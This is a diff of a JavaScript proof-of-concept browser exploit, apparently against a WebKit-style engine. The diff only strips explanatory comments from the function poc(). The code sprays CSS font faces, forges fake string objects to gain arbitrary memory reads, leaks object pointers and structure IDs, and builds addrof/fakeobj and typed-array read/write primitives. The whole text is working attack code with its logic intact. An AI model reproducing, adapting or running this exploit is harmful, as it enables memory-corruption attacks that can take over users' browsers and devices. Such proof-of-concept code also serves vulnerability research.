@@ -6,8 +6,8 @@ var SPRAY_FONTS = 0x1000;
 var GUESS_FONT = 0x200430000;
 var NPAGES = 20;
 var INVALID_POINTER = 0;
-var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
-var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
+var HAMMER_FONT_NAME = "font8"; 
+var HAMMER_NSTRINGS = 700; 
 
 function poc() {
 
@@ -80,7 +80,7 @@ function poc() {
 
     do {
 
-        var p_s = ptrToString(NPAGES + 2); // vector.size()
+        var p_s = ptrToString(NPAGES + 2);
         for (var i = 0; i < NPAGES; i++)
             p_s += ptrToString(guf + i * PAGE_SIZE);
         p_s += ptrToString(INVALID_POINTER);
@@ -143,10 +143,10 @@ function poc() {
 
     function makeReader(read_addr, ffs_name) {
         var fake_s = '';
-        fake_s += '0000'; //padding for 8-byte alignment
-        fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; //refcount=255, length=0xffffffff
-        fake_s += ptrToString(read_addr); //where to read from
-        fake_s += ptrToString(0x80000014); //some fake non-zero hash, atom, 8-bit
+        fake_s += '0000'; 
+        fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; 
+        fake_s += ptrToString(read_addr); 
+        fake_s += ptrToString(0x80000014); 
         p_s = '';
         p_s += ptrToString(29);
         p_s += ptrToString(guessed_addr);
@@ -162,12 +162,12 @@ function poc() {
         bad_fonts[guessed_font].family = ffs_name + "_evil1";
         bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
         bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
-        if (relative_read.length < 1000) //failed
+        if (relative_read.length < 1000) 
             return makeReader(read_addr, ffs_name + '_');
         return relative_read;
     }
 
-    var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr
+    var fastmalloc = makeReader(leak, 'ffs3'); 
 
     for (var i = 0; i < 100000; i++)
         mkString(128, '');
@@ -204,8 +204,8 @@ function poc() {
     }
 
     var rd_leak = makeReader(jsvalue_leak, 'ffs4');
-    var array256 = stringToPtr(rd_leak, 16); //arrays[256]
-    var ui32a = stringToPtr(rd_leak, 24); //Uint32Array
+    var array256 = stringToPtr(rd_leak, 16);
+    var ui32a = stringToPtr(rd_leak, 24); 
     var sanity = stringToPtr(rd_leak, 32);
 
     var rd_arr = makeReader(array256, 'ffs5');
@@ -218,29 +218,26 @@ function poc() {
     var structureid_low = union_i[0];
     var structureid_high = union_i[1];
 
-    //setup for addrof/fakeobj
-    //in array[256] butterfly: 0 = &bad_fonts[guessed_font+12] as double
-    //in array[257] butterfly: 0 = {0x10000, 0x10000} as jsvalue
+  
     union_i[0] = 0x10000;
-    union_i[1] = 0; //account for nan-boxing
-    arrays[257][1] = {}; //force it to still be jsvalue-array not double-array
+    union_i[1] = 0; 
+    arrays[257][1] = {}; 
     arrays[257][0] = union_f[0];
     union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
     union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
     arrays[256][i] = union_f[0];
 
-    //hammer time!
-
+   
     pp_s = '';
     pp_s += ptrToString(56);
     for (var i = 0; i < 12; i++)
         pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
 
     var fake_s = '';
-    fake_s += '0000'; //padding for 8-byte alignment
-    fake_s += ptrToString(INVALID_POINTER); //never dereferenced
-    fake_s += ptrToString(butterfly); //hammer target
-    fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; //length=34
+    fake_s += '0000';
+    fake_s += ptrToString(INVALID_POINTER);
+    fake_s += ptrToString(butterfly); 
+    fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000';
 
     var ffs7_args = [];
     for (var i = 0; i < 12; i++)
@@ -275,7 +272,7 @@ function poc() {
         arrays[258][0] = union_f[0];
         return arrays[257][32];
     }
-    //craft misaligned typedarray
+   
 
     var arw_master = new Uint32Array(8);
     var arw_slave = new Uint32Array(2);
